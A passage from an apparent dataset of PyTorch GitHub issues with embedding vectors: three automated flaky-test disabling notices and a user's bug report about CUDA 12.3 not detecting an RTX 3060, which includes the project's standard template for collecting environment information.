  0.02874855  0.0645396   0.01815465  0.44799542 -0.03918372 -0.03965785
  0.3323514   0.18094814  0.12301081 -0.13249883  0.10806957  0.3751165
  0.0061526  -0.01512149  0.20544341 -0.23664594 -0.5631167   0.02321096
 -0.13754791  0.02051806 -0.18368942 -0.04548984  0.00798499 -0.01018952
 -0.00139433 -0.02591879  0.15048999 -0.2967323  -0.13146767  0.33454162
  0.2249063   0.23885047  0.28307277  0.15265664 -0.0798995   0.17862697
  0.28670245 -0.1956796   0.09484246 -0.10853671 -0.636559   -0.2541511
  0.12249914 -0.13721745 -0.18666436 -0.05112335  0.05580721 -0.3060683
 -0.04931321 -0.042262   -0.23813722  0.32920235  0.14784926 -0.1986512
  0.04365275  0.26539916 -0.15274507 -0.42635605  0.03849697  0.04910795
 -0.22414261 -0.1189386  -0.26801312 -0.20543623  0.26208904 -0.04178886
 -0.08168291 -0.00510175 -0.01821632  0.29288447 -0.0857366  -0.15564388
 -0.28678262 -0.22142339 -0.4157323   0.03608903 -0.3122037   0.27990583
 -0.04459355 -0.04526323 -0.2153253  -0.19798647  0.20782232  0.00321615
  0.21912014 -0.18333513 -0.3724789  -0.10587995 -0.03025302  0.41592035
 -0.5723468  -0.48264456  0.03740532  0.05425502 -0.0177538  -0.02263648
 -0.18522307 -0.13555622 -0.12868264  0.21386106 -0.17031607 -0.26759833
 -0.01466933  0.02326184  0.15047519  0.43044537  0.03240497 -0.08749118
  0.00697832  0.01583385 -0.01226354  0.22778082 -0.24764627  0.34101066
  0.09345867  0.11055049 -0.2049717   0.13478312 -0.02045145 -0.12357032
  0.48420691 -0.5635926   0.26277214  0.24117194  0.15442207 -0.24442784
  0.4701302   0.31577218 -0.08141301 -0.21953654  0.18852438  0.16629075
 -0.1686398  -0.02566461  0.22879483 -0.2590047  -0.16678074 -0.07845048
 -0.0704931  -0.21666107  0.01142355  0.14435107  0.07810491  0.02696934
 -0.5130377   0.0086937   0.4230492  -0.31186825  0.15614931 -0.15782645
 -0.12760277  0.19895262  0.09104279 -0.28078902  0.07956132 -0.10569346
  0.18056443  0.03615809  0.51684856 -0.40802968 -0.05275287  0.25311548
 -0.02223964  0.35186625  0.00683037  0.10661993  0.00858995  0.23163836
  0.02424825  0.10879015  0.4111014  -0.19621214 -0.3498334   0.09979719
  0.11562735  0.0235817  -0.26464817 -0.04325924 -0.170564   -0.12051876
 -0.18627393 -0.10463724 -0.15828383 -0.14909568 -0.04714962 -0.21809106
 -0.0557949   0.5282982  -0.08223111 -0.23675415 -0.04383431  0.02432706
  0.15664415 -0.30113193 -0.19967662 -0.02137093  0.24532588 -0.01914531
  0.1737006   0.14472839 -0.17244604  0.02614657 -0.15102044  0.01194324
  0.16519722  0.5741269  -0.11371926  0.25980806  0.3237793   0.63072574
 -0.12675259  0.1084379  -0.4140148  -0.36993864  0.28778872 -0.03276381
 -0.01899912 -0.08327337  0.00090792  0.37574813 -0.49599275  0.25620472
 -0.23068278  0.36846206  0.22770149 -0.08986023  0.4477728  -0.1265074
  0.06143682  0.04232864 -0.03055679  0.09471127  0.01130399  0.1184441 ]"
DISABLED test_activations_gelu__cpu (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_activations_gelu__cpu&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18238123500).

Over the past 3 hours, it has been determined flaky in 16 workflow(s) with 48 failures and 16 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_activations_gelu__cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.37376887 -0.0829218  -0.03228698 -0.03435066 -0.06204212 -0.17561045
  0.24871235  0.04939048 -0.3087458  -0.15614565  0.43214726 -0.20232937
  0.22147322  0.09992321 -0.02748416 -0.08821044 -0.15019011  0.00235876
  0.3478668   0.03751386 -0.17635727  0.00131309 -0.2221559   0.13681594
  0.07744235 -0.0041046  -0.19805801 -0.06702916  0.04691765  0.113615
  0.2634556   0.1559373  -0.2452734  -0.03585475  0.59282047  0.1792636
 -0.12133488 -0.20502871 -0.1839332  -0.14090312  0.37043214  0.02880961
 -0.07588235 -0.19836026  0.25167277 -0.00643616 -0.10946621  0.09686627
 -0.23772912 -0.13634156  0.09899928 -0.10153838  0.01594792 -0.47726673
  0.07077059 -0.05937942  0.15221289  0.49376398  0.11751912  0.20307833
  0.00339336 -0.02206898 -0.01570535  0.07613754 -0.07842115  0.03332335
  0.15469833 -0.28304592  0.6150732  -0.09184602  0.19386779  0.04361251
 -0.35797057 -0.13356563  0.23120886  0.40867338 -0.29633155 -0.07863758
  0.01062764 -0.08332234 -0.09509759  0.06221738  0.13135253  0.1430366
  0.27159244  0.12203897  0.08972335 -0.0656445   0.12659566 -0.13539468
  0.19560876  0.06622291 -0.04394867 -0.04935841  0.06098505 -0.10091911
  0.3674571  -0.06423448 -0.3759483   0.13932656  0.08842763 -0.47634947
 -0.07980632  0.36628222 -0.11060648 -0.260651    0.3358832  -0.07679159
  0.02252388 -0.12442677  0.23890167  0.00268778 -0.05825216  0.20623943
  0.04327708 -0.06400715 -0.13748941 -0.00643552  0.03292708  0.6003537
 -0.20075655 -0.2998447   0.09692058 -0.00780132  0.12785852  0.12226659
 -0.19658378  0.03718479  0.07330766  0.16216172  0.20027284  0.17492115
 -0.29013368 -0.08698923 -0.00204205  0.02793874 -0.15166306 -0.32195595
 -0.11442953  0.19605868 -0.19193569  0.22506863 -0.07561585 -0.164063
  0.32185316  0.03794862 -0.07514748 -0.04140626 -0.13283217 -0.0039953
 -0.0523598   0.05784252  0.22874117  0.49548727  0.02070442 -0.07786835
  0.3830843   0.10250967  0.09503254 -0.12515469 -0.02976742  0.38130462
 -0.1701063   0.22272502  0.26568997 -0.20606303 -0.44055682 -0.1116524
  0.03173238  0.147016   -0.13610204 -0.03631524  0.12401769 -0.20558001
 -0.03952577 -0.09874818  0.32809016 -0.29923806 -0.05653119  0.02860944
  0.11747987 -0.06704608  0.05247594  0.15843642 -0.19599369  0.2617937
  0.2152893  -0.23981985  0.00372968 -0.08298901 -0.67300975  0.01132592
  0.10309261  0.11748836 -0.16608123 -0.3050119   0.00408985 -0.0210682
 -0.1298562   0.11942007 -0.2858509   0.31099504  0.17559543 -0.10251238
 -0.01375894  0.10388236 -0.4422343  -0.21462557  0.1409885  -0.0058053
 -0.30168995 -0.14361006 -0.13608392 -0.29969168 -0.07106323  0.15214768
  0.03194737  0.12972349  0.09128891  0.13463978 -0.4893371  -0.01220737
 -0.40866566 -0.14237665 -0.25072807 -0.20510483  0.00125089  0.31377304
 -0.03900481  0.08776229 -0.0852127  -0.1450386   0.21658021  0.03438628
  0.42657694 -0.35118484 -0.16210298 -0.07057753  0.01945314  0.44237924
 -0.6436375  -0.3877194  -0.15774135  0.16022795 -0.12285212  0.10381705
  0.0842304  -0.15881011 -0.22854882  0.22261581 -0.1582044  -0.26482862
  0.13723071 -0.04668301  0.13757363  0.46996406 -0.26682055  0.13093114
  0.07723401  0.06275132  0.07536731  0.33654785 -0.17399107  0.31181997
  0.15407577  0.17874253 -0.20649877  0.26978832  0.08069243 -0.10120314
  0.57923067 -0.51632476 -0.07841595  0.0948581   0.13700488 -0.21112686
  0.29085773  0.06591365 -0.06172547 -0.00687661  0.30209374  0.04118041
 -0.26794565 -0.07470454  0.29832864 -0.3092236  -0.07885627 -0.16467519
 -0.36807865 -0.08515996 -0.11931061  0.14314163  0.14172469 -0.00724623
 -0.23722842  0.06372494  0.38268405 -0.3202509  -0.00420347 -0.12806025
 -0.31776825 -0.10453089 -0.02813626 -0.5064231   0.02478586 -0.2365103
  0.05106953 -0.07303801  0.4556982  -0.22338912  0.2100087   0.3939657
  0.01764434  0.27868858 -0.0621837  -0.07555552 -0.2621243   0.43071407
  0.01687166  0.2296496   0.4298581  -0.06614152 -0.21893802  0.20194918
  0.13040599 -0.00418229 -0.4849993  -0.01292772 -0.1531308   0.03559262
 -0.11758915 -0.17325185 -0.14328465 -0.23931654  0.02349324 -0.00295261
 -0.21967298  0.48940527  0.08774246 -0.28819948  0.14662273 -0.07767412
  0.16136193 -0.31216586 -0.19954015 -0.1147102   0.29792905  0.141625
  0.15294343  0.10712577 -0.05433743  0.08703817 -0.35273618 -0.0178851
 -0.02970918  0.50602746  0.06907053 -0.02514261  0.28003192  0.4975382
 -0.30602923 -0.19987614 -0.41369924 -0.32796624  0.21150538 -0.02419615
  0.06826104 -0.0591047  -0.00941326  0.41224083 -0.49214065  0.14390464
 -0.159406    0.2769788   0.07178223 -0.05349389  0.2900714  -0.15620983
 -0.0557235   0.07117121 -0.06798142  0.07796411  0.02290426  0.06690368]"
DISABLED test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18237784716).

Over the past 3 hours, it has been determined flaky in 16 workflow(s) with 48 failures and 16 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.29157582  0.14101556 -0.11599042  0.05405243  0.05369072 -0.19913368
  0.09662252  0.44024572 -0.32749826 -0.19720432  0.36153853 -0.06795275
  0.25480366 -0.11275887 -0.16228819 -0.13140449 -0.10075161 -0.00628299
  0.27332816  0.00190847 -0.18635494  0.03338934 -0.2581838   0.29344928
  0.02001719 -0.05093918 -0.29851693  0.25714362 -0.00154897  0.21985835
  0.32468933  0.05704539 -0.39980313 -0.03107048  0.43696854  0.09862109
 -0.0518276  -0.12059769 -0.18532212 -0.20989844  0.07876714  0.11907189
  0.06119307 -0.02566571  0.30343735 -0.1262955  -0.333669   -0.02789951
 -0.28900743 -0.14968811  0.02646432 -0.06290194 -0.22012049 -0.37839013
  0.12349095 -0.01530135  0.19635582  0.30141395  0.10140719  0.02414949
  0.41460407 -0.14819774 -0.07708737 -0.06199871  0.03325409  0.15251021
  0.16138563 -0.10241796  0.38836908  0.09322642  0.2441698  -0.1286961
 -0.319626    0.11050525  0.23182277  0.343228   -0.40748495 -0.14115205
 -0.07984573 -0.0674396   0.1287106   0.02191846 -0.23411667 -0.13828224
  0.2470544   0.05935274  0.16682827 -0.39299762 -0.04085452 -0.12060509
  0.3090409   0.04919685 -0.1869434   0.01850168 -0.10982972 -0.01036013
  0.15887348 -0.27946743 -0.26922148  0.1692703   0.13965717 -0.2277419
 -0.39368936  0.10337438 -0.4583894  -0.15159142  0.40814322  0.2404764
  0.12402586 -0.15906923  0.12987576  0.00149118  0.00167195  0.0558117
  0.13283825  0.03605504 -0.01237914 -0.02256672  0.18070173  0.48634607
 -0.25919375  0.05062982  0.08136256  0.01680773  0.46266532 -0.06503481
 -0.05835967  0.10544598  0.1431666  -0.15352531  0.05898554  0.0245277
 -0.14785962 -0.0322345  -0.11441369 -0.07738972  0.17659795 -0.16744761
  0.11958326  0.08439513 -0.40284115  0.07846976  0.04892967 -0.2793588
  0.38351527  0.05933695 -0.282136   -0.09855141  0.09445164  0.03760264
  0.13362443  0.13663676  0.09780613  0.22597554 -0.07902005  0.15277588
  0.12309777  0.13969423 -0.06451041 -0.03406062  0.07238239  0.23265661
 -0.16550133 -0.14035149  0.00911777  0.02938119 -0.30954245  0.01895184
 -0.3474827   0.21680818  0.01891258  0.06692116 -0.03519615  0.05017578
  0.2334037  -0.11452907  0.07058889 -0.40994367 -0.12738669  0.24762022
  0.04077984  0.01072704  0.11386609  0.23124039 -0.01981058  0.13657327
  0.17608166 -0.15110062  0.10730324  0.16113533 -0.5339335  -0.04551642
  0.33177167  0.19863647 -0.18304935 -0.36332613  0.10718218  0.04196277
 -0.00757968 -0.04275783 -0.28493965  0.2129493   0.19247541 -0.13833709
 -0.22655247  0.04496147 -0.04296888 -0.2828533   0.06111607  0.06287251
 -0.55011445 -0.14703351 -0.04727618 -0.24240057  0.15498222 -0.06744652
  0.05850234 -0.08782937  0.22416267  0.34318     0.00630031 -0.04499215
 -0.38368636 -0.23264118 -0.4430866   0.15967064 -0.32102627  0.22916517
 -0.23893824  0.14655598 -0.22425166 -0.22147855  0.41460353  0.18496962
  0.2972206  -0.10548804 -0.20370935 -0.10522638 -0.04968071  0.19469914
 -0.6339767  -0.4438337  -0.20206696  0.29391176  0.21036802  0.18294752
 -0.39442044 -0.05993341 -0.19925004  0.20207115 -0.29389745 -0.25982124
  0.17092842 -0.10246548  0.03017771  0.4551594  -0.02371753 -0.14837478
  0.12486781  0.03580912  0.13770932  0.05010703 -0.23967823  0.3650204
  0.1481016   0.19835779 -0.25268173  0.02174976  0.19374588 -0.07261063
  0.29158622 -0.80719036  0.21670923  0.22252329  0.32378876 -0.11982646
  0.31542355  0.08280249 -0.00699504 -0.08889683  0.10173319  0.2629565
 -0.30338746  0.15173855  0.13287203 -0.15567383 -0.15775257  0.10716091
 -0.17357242 -0.08731307 -0.06821191  0.17592233 -0.02199754 -0.21054608
 -0.1666655   0.2088331   0.2765058  -0.39592147  0.01792124 -0.19292074
 -0.09264404  0.29856128  0.1557183  -0.02234548  0.03665509  0.09994672
  0.28231177 -0.06082467  0.30985197 -0.30058974 -0.02430998  0.34858844
 -0.07414496  0.287224    0.01202562 -0.16409762 -0.10473071  0.17629069
  0.01260931  0.00803772  0.26537934 -0.11018186 -0.20685104  0.40135688
  0.05929171 -0.00865493 -0.31467474 -0.20926905 -0.05952239  0.15656474
  0.09768014  0.13230449 -0.4476949   0.05278296 -0.24994299 -0.07757201
 -0.26959258  0.55029935  0.11484187 -0.1808542   0.06986588  0.25437126
  0.15529865 -0.39097774 -0.09227277 -0.12470538  0.07231835  0.30641982
  0.05933585  0.26913062  0.00762879 -0.06261511 -0.3694564  -0.03097117
  0.25079536  0.41263998  0.15470022  0.25904045  0.12703137  0.66135883
 -0.2062774  -0.04229949 -0.59646225 -0.24127987  0.2568933  -0.17691259
  0.09543745 -0.01287884  0.09644918 -0.14931813 -0.22744112  0.10810322
 -0.19768962  0.15612681  0.01659539 -0.01783443  0.02747343 -0.02224901
 -0.28953362 -0.23675232  0.22339383  0.05006    -0.09901714  0.23557037]"
Bug Report No Version Of Pytorch for cuda 12.3 needs reproduction,"If you have a question or would like help and support, please ask at our
[forums](https://discuss.pytorch.org/).

If you are submitting a feature request, please preface the title with [feature request].
If you are submitting a bug report, please fill in the following details.

## Issue description

since updating both my gpu driver and cuda to cuda 12.3 pytorch isnt detecting my gpu and is complaing that cuda is not availible and that i dont have supported gpu when it was working just fine my gpu is a rtx 3060 yes with cuda support

## Code example

torch.is.availible()

## System Info
Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/main/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

- PyTorch or Caffe2: pytorch
- How you installed PyTorch (conda, pip, source):
- Build command you used (if compiling from source):
- OS: windows 10
- PyTorch version: latest available
- Python version:
- CUDA/cuDNN version: latest
- GPU models and configuration:
- GCC version (if compiling from source):
- CMake version:
- Versions of any other relevant libraries: cuda toolkit 12.3
",False,"[-4.06680226e-01 -4.59329873e-01 -3.07636768e-01  4.38233390e-02
 -1.13233849e-01 -1.86397672e-01 -3.44881326e-01 -7.94038624e-02
 -1.58770636e-01 -2.43047938e-01  6.67928578e-03  2.13759355e-02
 -1.77501380e-01 -1.90552220e-01 -2.54791796e-01  1.47466555e-01
 -3.41702364e-02  2.28765793e-03  1.79474249e-01  1.19456448e-01
 -2.29916215e-01  1.43412799e-01 -1.13677822e-01  7.33178714e-03
 -1.05306253e-01 -5.34781143e-02  3.40666249e-03 -1.99407712e-01
 -2.32419893e-02 -2.05747522e-02  1.93104297e-01  4.07923818e-01
  2.93001980e-02  3.58019397e-02  2.37505995e-02 -2.16661334e-01
 -5.51163316e-01 -4.01284605e-01  1.40235364e-01  7.68578351e-02
  4.24486026e-03  1.09065203e-02 -4.36733514e-02  1.02485344e-02
 -2.13644087e-01  7.07447622e-03 -7.72154927e-02  1.59623206e-01
 -2.60394722e-01 -1.20699555e-01  8.24220106e-02 -2.04350367e-01
  1.99305527e-02 -7.14305118e-02  1.53258592e-01 -1.94903955e-01
 -1.70886785e-01  2.16871873e-01  5.35594625e-03  1.98331013e-01
  2.68780291e-01  4.39166352e-02  1.77154735e-01 -5.66851012e-02
 -5.68390638e-03  3.17642450e-01 -1.17228493e-01 -2.41432562e-01
  4.53397453e-01 -1.51804447e-01 -1.13061778e-01  1.03123344e-01
 -3.19495618e-01 -1.10429093e-01 -1.08553786e-02  1.04260549e-01
  1.03607148e-01  1.78570628e-01 -9.45889205e-02 -1.80803418e-01
  1.61109000e-01  2.95497000e-01  1.30723357e-01 -3.42241734e-01
  2.78503835e-01 -2.66192947e-03  1.23473689e-01 -1.83042977e-03
 -3.47350895e-01 -2.54282981e-01  3.76442224e-01  1.79189965e-01
 -3.42076644e-02  1.69056535e-01  2.20342964e-01  3.34263206e-01
 -3.23271871e-01 -2.94147074e-01 -1.39993683e-01 -2.67710328e-01
 -1.86742693e-01 -2.83114493e-01  4.30406518e-02  4.52119589e-01
 -5.08279026e-01 -1.57855004e-01  2.28476413e-02  2.02082932e-01
 -1.47504777e-01  6.46193624e-02  2.11188182e-01 -1.24127883e-03
  1.04534134e-01  2.63888109e-02  1.68215349e-01 -1.55315995e-01
 -1.91133052e-01 -8.95764753e-02 -5.45947738e-02  1.98771596e-01
 -1.01508223e-01 -1.45432994e-01 -3.05433888e-02 -9.81175248e-03
  1.80179149e-01 -3.00201233e-02 -1.85894836e-02  1.20645560e-01
  8.11126083e-02  1.34585902e-01  1.60139665e-01 -7.18826801e-02
  5.59358783e-02  4.44538593e-02 -1.25828832e-01  7.65301660e-02
 -1.31717041e-01 -2.18678147e-01  7.88530409e-02 -1.58359781e-01
 -1.04952343e-02 -7.94360191e-02 -7.44359344e-02 -1.24394350e-01
 -7.98724070e-02  1.73779935e-01 -1.59982964e-02  1.85641810e-01
  1.59823239e-01  4.79174316e-01 -1.76835265e-02  1.38657391e-02
 -2.20901430e-01  6.98131979e-01 -8.59445184e-02 -2.97745578e-02
  9.89226997e-02 -1.53056145e-01  6.97465837e-02 -3.19291264e-01
  1.27017871e-01  9.26264226e-02 -1.47177894e-02 -7.93968216e-02
 -3.36630911e-01  1.02348231e-01 -5.92998266e-02 -4.56491709e-02
  1.42669961e-01  1.30715340e-01 -1.15295678e-01  5.57901263e-02
  2.60790110e-01 -1.51595846e-03  3.51096779e-01 -3.50603610e-02
 -1.16520613e-01 -7.32835159e-02  1.67728931e-01  2.52194881e-01
 -1.80314302e-01  2.09760383e-01  4.20142829e-01 -4.91665602e-02
  9.91780758e-02  9.77836549e-04  6.32798672e-02 -9.96106341e-02
 -2.50706494e-01 -8.31508413e-02 -1.85019076e-01 -2.83628523e-01
 -4.72898483e-02 -2.21959591e-01 -7.76126161e-02  5.86614013e-04
  1.16350219e-01  2.36400276e-01  8.53071511e-02  1.72425788e-02
 -1.77762151e-01 -8.03287104e-02  1.04237869e-01  1.06681824e-01
 -2.45133162e-01  1.13267172e-02 -2.76196808e-01  1.06805656e-02
 -2.29097456e-01  1.62687059e-02 -1.56695306e-01 -1.16912842e-01
 -2.32505158e-01 -3.62051241e-02 -1.07635587e-01  1.41313523e-01
  2.43094131e-01  2.13407248e-01  1.23869382e-01  3.48033786e-01
  5.16010523e-02 -2.94553358e-02  1.39538229e-01  3.35983932e-02
  5.14966808e-03  1.10606842e-01  4.70372010e-03 -3.08422539e-02
 -3.10229305e-02  2.74309926e-02 -2.30170220e-01  2.01668441e-01
  1.80541337e-01 -2.63137948e-02  3.82168069e-02  2.68380225e-01
 -1.82776749e-01  2.99724154e-02 -3.46326455e-02  3.00785989e-01
 -1.39136493e-01  3.84112969e-02 -3.80044669e-01 -3.75779159e-02
  1.85428783e-01  3.16493273e-01 -1.21506214e-01  9.49030742e-03
 -3.33945572e-01 -7.79372826e-02  3.70779276e-01 -4.76374954e-01
  1.84224039e-01 -1.26892537e-01  1.44957095e-01 -8.25440437e-02
  2.61720773e-02 -2.27749217e-02  2.12904960e-01  1.10760778e-01
  3.39547306e-01  1.43744469e-01 -3.68334800e-01  2.52004504e-01
  2.09308341e-01  2.23282069e-01 -2.37267643e-01  7.77315423e-02
 -2.13585302e-01 -2.12093472e-01  2.70973533e-01 -1.27366543e-01
  4.03909773e-01  1.26954287e-01  3.70978117e-01 -4.14577127e-02
  3.77484262e-01 -1.78883791e-01 -4.20577377e-02  4.25925851e-02
  4.37506735e-01 -1.97952777e-01  1.15846701e-01 -4.37927572e-03
  9.42632258e-02 -3.31025794e-02 -3.08449149e-01 -3.65097702e-01
 -2.32547522e-01 -2.42578492e-01 -7.03716725e-02  2.10384279e-01
  5.07081389e-01 -2.91324425e-02 -1.39002830e-01 -8.34735781e-02
  6.47857860e-02  1.15311965e-01  8.95593166e-02 -1.11476049e-01
 -4.96379852e-01 -2.04992071e-01  1.80297881e-01 -1.84752181e-01
 -3.91469777e-01  1.39706098e-02 -1.12288613e-02  1.63613960e-01
  2.96195596e-01 -1.37937397e-01  1.11592084e-01 -4.99966927e-02
 -3.63094881e-02  2.15094864e-01 -1.20849691e-01  2.06285547e-02
 -1.21942766e-01  2.88369924e-01  3.41106206e-01  1.33320436e-01
  1.03004761e-02 -2.12137461e-01 -4.13326234e-01  8.09135437e-02
  2.58859396e-01  6.17430508e-02 -1.76533252e-01  2.20506191e-01
 -8.71878304e-03  5.50082505e-01  9.86690521e-02  7.62182996e-02
  3.48031297e-02  3.75888944e-02  1.04540605e-02  2.74289232e-02
  1.96785796e-02 -1.37097299e-01  1.40077993e-01 -2.85364866e-01
 -2.94739842e-01 -4.09984663e-02 -3.09084654e-02 -4.97358799e-01
 -1.83919698e-01 -4.56322879e-02  2.73165405e-01  6.57534480e-01
 -1.40096471e-01  3.28142568e-02  7.95040131e-02  1.63784713e-01
 -7.17170089e-02 -2.09893093e-01 -5.62922806e-02  1.50144547e-01
  3.88336897e-01  1.42096221e-01  4.04845178e-01  1.63286090e-01
 -2.00087711e-01  2.92068779e-01  5.36229461e-02 -1.67995721e-01
 -8.00075382e-02 -3.17690432e-01 -1.33509293e-01 -3.37328941e-01
  2.42031664e-01  4.98375148e-02 -4.01776671e-01 -1.71015356e-02
 -1.14732593e-01  9.32538435e-02  2.40502790e-01  5.31103089e-02
 -9.90960747e-02  3.29355896e-02  1.46962374e-01 -7.84705132e-02
  4.52522524e-02 -4.31123599e-02 -7.30352253e-02 -1.83503449e-01]"
DISABLED test_layer_norm_backward_size_1024_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_1024_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18201273111).

Over the past 3 hours, it has been determined flaky in 19 workflow(s) with 57 failures and 19 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_1024_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.43949726e-01  2.99943052e-02 -1.45207375e-01 -1.69705618e-02
 -1.66757554e-01 -2.94580549e-01 -8.85420889e-02  2.11140662e-01
 -5.15796900e-01 -9.86868590e-02  3.76393735e-01 -1.38853118e-01
  3.71242702e-01  9.79934186e-02 -1.38114214e-01  1.01740565e-02
 -2.49459237e-01 -1.08156748e-01  3.98188293e-01  1.05355293e-01
 -1.16287485e-01 -4.93956506e-02 -1.98962539e-01  3.18442404e-01
  2.02072799e-01  3.39428410e-02 -2.23107591e-01 -7.62059167e-02
  1.47031918e-01  5.93471825e-02  1.39040291e-01  1.60698175e-01
 -3.02882433e-01 -4.09942232e-02  5.00176907e-01  1.86730385e-01
 -1.04960777e-01 -1.53579026e-01 -3.43746305e-01  4.09123339e-02
  2.41377175e-01  1.65250689e-01 -7.23670423e-02 -1.10242389e-01
  1.90611333e-01  2.41423734e-02 -1.10966206e-01  3.18217039e-01
 -3.01893950e-01 -3.38607758e-01  2.98519135e-01 -1.00776218e-01
 -4.65198122e-02 -3.73212963e-01  1.23953242e-02 -3.52458864e-01
  1.26638234e-01  3.11313748e-01  9.81258750e-02  3.15345347e-01
  7.58782327e-02 -2.75745541e-02 -1.04318336e-01 -1.46375567e-01
 -4.64389026e-02  6.81894198e-02  1.93372741e-01 -1.86417907e-01
  3.42810571e-01  4.06529456e-02  1.53478265e-01 -6.08165935e-03
 -3.68663281e-01 -4.06692326e-02  2.32068330e-01  1.95404321e-01
 -2.68525660e-01  5.13636209e-02 -1.04834899e-01 -8.77950639e-02
 -7.65151605e-02  4.01026011e-02  5.05375862e-02  6.17602058e-02
  1.22927524e-01  3.29330191e-03  1.65746540e-01 -3.93845551e-02
  8.31684545e-02 -2.61823952e-01  3.74026000e-01  2.14045674e-01
 -3.96623135e-01  5.32395318e-02 -6.44401312e-02 -1.44838244e-01
  2.54476368e-01 -1.82750136e-01 -2.31179804e-01  1.97591066e-01
  2.44763911e-01 -4.31696475e-01 -1.66553661e-01  3.95492196e-01
 -1.84996232e-01 -2.18978852e-01  4.28383827e-01  1.38217658e-01
 -4.10997644e-02 -7.05445334e-02  1.83888495e-01  1.02614760e-02
 -7.72707015e-02  6.57022595e-02  1.38553813e-01 -1.33339822e-01
 -2.00528145e-01 -1.42236352e-01 -1.01483911e-02  5.13693154e-01
 -2.24521756e-01 -9.47358310e-02  1.30037665e-01 -9.66913998e-02
  3.24411839e-01 -4.97495383e-03  2.49646809e-02 -2.91506946e-03
  2.07246214e-01  1.75818384e-01  1.23891756e-01  2.04276815e-01
 -2.29693204e-01 -5.47808260e-02  6.25890940e-02  8.14993382e-02
 -9.72971469e-02 -2.44244576e-01 -1.05796475e-02  1.48943722e-01
 -3.33866775e-01  2.49893278e-01  6.03803433e-04 -2.64924884e-01
  4.99328613e-01  7.82614648e-02 -2.95184225e-01  1.23839326e-01
 -8.57278146e-03  8.85071903e-02  2.78246626e-02  4.59293202e-02
  2.83579141e-01  2.05885068e-01  1.30858779e-01 -2.49997601e-02
  1.63319930e-01  5.29945791e-02  1.58451229e-01 -1.94579959e-01
  3.45820524e-02  3.17098826e-01 -1.60879299e-01  5.24873212e-02
  2.44535208e-01 -8.11476409e-02 -4.49379951e-01 -9.10145566e-02
  5.05149886e-02  1.37402773e-01  2.95331068e-02  2.21789218e-02
  2.35558227e-01  3.06356288e-02  9.64953750e-02 -2.70185351e-01
  1.47059947e-01 -4.03036475e-01 -6.01133108e-02  2.06139132e-01
  5.42335398e-02 -6.62399828e-02  2.49659598e-01  8.75400230e-02
  6.91234786e-03  1.31845504e-01  2.56815553e-01 -6.23013861e-02
  5.73228896e-02 -6.95540756e-02 -7.01344013e-01 -2.29844600e-01
  5.77856638e-02  5.31593151e-02 -2.05328763e-01 -3.72517914e-01
 -4.83008400e-02  1.17751919e-02 -8.62193778e-02  8.04571360e-02
 -3.11161339e-01  3.45227778e-01  2.54496455e-01  3.97190973e-02
  2.81454939e-02  1.23295993e-01 -2.05313772e-01 -3.76959682e-01
 -3.88681144e-02  1.45599067e-01 -3.01951021e-01 -1.16537973e-01
 -1.24559337e-02 -3.98157179e-01 -1.90566108e-03  1.71211451e-01
  5.51195852e-02 -1.09349072e-01  2.01122612e-02  1.73940018e-01
 -2.00224519e-01 -1.19215295e-01 -3.38513643e-01 -1.14836745e-01
 -4.69747812e-01 -6.59435689e-02 -2.24249214e-01  3.75658512e-01
 -2.64440943e-02  7.58038983e-02 -1.71527088e-01 -4.55757342e-02
  1.19982071e-01 -2.34809667e-02  4.16238725e-01 -3.85476947e-01
 -1.89952210e-01 -9.70123485e-02  6.85467944e-02  5.01071453e-01
 -6.16638243e-01 -4.87688601e-01 -8.00084621e-02 -2.35412810e-02
